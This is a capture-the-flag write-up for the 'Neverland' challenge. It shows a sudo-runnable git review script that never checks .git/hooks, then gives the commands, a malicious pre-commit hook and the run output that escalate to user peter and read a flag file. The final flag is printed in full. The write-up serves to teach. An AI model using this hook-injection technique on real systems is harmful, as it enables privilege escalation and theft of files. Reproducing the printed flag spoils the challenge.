---
title: Neverland
tags:
  - misc
  - CTF
  - 🇫🇷
---


- Author: Log_s
- Difficulty: easy
- Points: 50

## Description

Peter Pan and Captain Hook are once again fighting in Neverland, instead of working and pushing PRs into production. Since this is a regular occurrence, we have created a script that allows the intern to review PRs in their stead. Please don't touch Peter's fairy powder stock in `/home/peter/flag.txt` (i'm still convinced it's cocaine though, why else would they run around with swords in the office pretending they are flying ??)

Format: `^Hero{\S+}$`

## Solution

### Quick overview

We are provided with following SSH credentials:
- user: `intern`
- password: `fairy`

After logging in, and listing current user's privileges, it appears that we can execute `/opt/commit.sh` as `peter`, without a password :

```
sudo -l
User intern may run the following commands on neverland:
    (peter) /opt/commit.sh
```

Let's give it a look.

### First evidence, the sh script

`/opt/commit.sh:`
```sh
#!/bin/bash

# ==============================================================================
#  Admin Git Review & Commit Script
# ==============================================================================
#
# DESCRIPTION:
# This script is intended to be run by an 'admin' user. It automates the
# process of reviewing and committing changes from a user-submitted Git
# repository archive.
#

# --- Configuration ---

# Path to the admin's "official" repository.
# This script will initialize it if it doesn't exist.
ADMIN_REPO_PATH="/app"
# Directory to temporarily extract user submissions.
TEMP_DIR="/home/peter/git-review-$$" # $$ ensures a unique directory per run


# --- Script Body ---

# Exit immediately if a command exits with a non-zero status.
set -e

# Function to print messages with a prefix
log() {
    echo "[ADMIN GIT COMMIT] $1"
}


# 1. Validate user input
if [ "$#" -ne 1 ]; then
    log "ERROR: You must provide the path to one repository archive (.tar.gz)."
    log "Usage: $0 <path-to-archive.tar.gz>"
    exit 1
fi

USER_ARCHIVE=$1

if [ ! -f "$USER_ARCHIVE" ]; then
    log "ERROR: File not found: $USER_ARCHIVE"
    exit 1
fi


# 2. Prepare for review
log "Received submission: $USER_ARCHIVE"
mkdir -p "$TEMP_DIR"
log "Extracting archive to temporary directory: $TEMP_DIR"
tar -xzf "$USER_ARCHIVE" -C "$TEMP_DIR"

EXTRACTED_DIR=$(find "$TEMP_DIR" -mindepth 1 -maxdepth 1 -type d)
cd "$EXTRACTED_DIR"
log "Changed directory to $(pwd)"


# 3.1 Security Check 1: Verify commit history
log "Verifying that your repository is up-to-date..."
ADMIN_LAST_COMMIT=$(git --git-dir="$ADMIN_REPO_PATH/.git" log -1 --pretty=%H)
USER_LAST_COMMIT=$(git log -1 --pretty=%H)

log "Admin's latest commit: $ADMIN_LAST_COMMIT"
log "Your latest commit:    $USER_LAST_COMMIT"

if [ "$ADMIN_LAST_COMMIT" != "$USER_LAST_COMMIT" ]; then
    log "REJECTED: Your repository's last commit does not match the official repository."
    log "Please pull the latest changes from the official repository before submitting."
    rm -rf "$TEMP_DIR"
    exit 1
fi

log "SUCCESS: Commit history matches."


# 3.2 Security Check 2: Verify .git/config integrity
log "Verifying integrity of .git/config file..."
ADMIN_CONFIG_HASH=$(sha256sum "$ADMIN_REPO_PATH/.git/config" | awk '{ print $1 }')
USER_CONFIG_HASH=$(sha256sum ".git/config" | awk '{ print $1 }')

log "Admin's .git/config hash: $ADMIN_CONFIG_HASH"
log "Your .git/config hash:    $USER_CONFIG_HASH"

if [ "$ADMIN_CONFIG_HASH" != "$USER_CONFIG_HASH" ]; then
    log "REJECTED: Your .git/config file has been tampered with. Integrity check failed."
    rm -rf "$TEMP_DIR"
    exit 1
fi

log "SUCCESS: .git/config is valid. Proceeding with review."


# 4. Review and Commit the changes
log "Reviewing your proposed changes..."
echo "--------------------------------------------------"
git status
echo "--------------------------------------------------"

log "Everything looks good. Adding your changes to the staging area."
git add .

log "Committing your changes to the official branch. Stand by..."
GIT_COMMITTER_NAME="Admin" GIT_COMMITTER_EMAIL="admin@localhost" \
git commit -m "Accepted user submission" > /dev/null

log "Changes successfully committed."


# 5. Cleanup
log "Cleaning up temporary files..."
cd /
rm -rf "$TEMP_DIR"

log "Process complete. Thank you for your contribution."
exit 0
```

We also notice an `./app` repository mentioned.
The script is waiting for a `.tar.gz` archive, it:
1. Extracts it
2. Checks last commit integrity against `./app` repository
3. Checks .git/config integrity against `./app` repository.
4. If both checks are valid, runs `git add .` then `git commit`

There is a vulnerability here because it never checks integrity of commits hook (`.git/hooks/`).

So what we could try would be to duplicate `./app` as a new repository, and then add a pre-commit hook with a payload that retrieves the flag. The pre-commit hook will be run as soon as `commit.sh` will sends `git commit -m "Accepted user submission" > /dev/null`, and since it will be executed with same permissions as `peter`, it will be able to read the flag.txt file.

### Crafting the malicious repository

#### 1. Copy the ./app repo

```bash
mkdir evil-repo; cd evil-repo
git init
git pull /app # to have same last commit hash than in /app
```

#### 2. Adding the pre-commit hook

```
cat << EOF > .git/hooks/pre-commit
#! /bin/bash
cat /home/peter/flag.txt > /tmp/flag.txt
echo "=>  flag copied! <="
EOF

chmod +x .git/hooks/pre-commit # so it is always run
```

#### 3. Adding changes

We need to create dummy changes so the `git add .` and `git commit ...` can be triggered.

```bash
touch dummy.txt
```

#### 4. Creating the archive

Finally we can create an archive to match format required by `commit.sh`.

```bash
tar -czf evil.tar.gz evil-repo/
```

### Exploit

Now that the malicious repository is ready, we send it to the `commit.sh` script, run as `peter`.

```bash
sudo -u peter /opt/commit.sh evil.tar.gz
```
```
[ADMIN GIT COMMIT] Received submission: evil.tar.gz
[ADMIN GIT COMMIT] Extracting archive to temporary directory: /home/peter/git-review-55
[ADMIN GIT COMMIT] Changed directory to /home/peter/git-review-55/evilrepo
[ADMIN GIT COMMIT] Verifying that your repository is up-to-date...
[ADMIN GIT COMMIT] Admin's latest commit: 46d4c00b38c008c3e17dc59083f7ee84ce08ccce
[ADMIN GIT COMMIT] Your latest commit:    46d4c00b38c008c3e17dc59083f7ee84ce08ccce
[ADMIN GIT COMMIT] SUCCESS: Commit history matches.
[ADMIN GIT COMMIT] Verifying integrity of .git/config file...
[ADMIN GIT COMMIT] Admin's .git/config hash: cfe7ba1238c9a78be7535d7c63bcaf5a4d5011d46b07c9b45d3bbf7d6c312dfe
[ADMIN GIT COMMIT] Your .git/config hash:    cfe7ba1238c9a78be7535d7c63bcaf5a4d5011d46b07c9b45d3bbf7d6c312dfe
[ADMIN GIT COMMIT] SUCCESS: .git/config is valid. Proceeding with review.
[ADMIN GIT COMMIT] Reviewing your proposed changes...
--------------------------------------------------
On branch master
nothing to commit, working tree clean
--------------------------------------------------
[ADMIN GIT COMMIT] Everything looks good. Adding your changes to the staging area.
[ADMIN GIT COMMIT] Committing your changes to the official branch. Stand by...
=>  flag copied! <=
```

Success ! All we have left to do is `cat /tmp/flag.txt`

## Flag

<details> 
<summary>Spoiler</summary>

```
Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8c2ffabaa57119e3bc42}
```

</details>
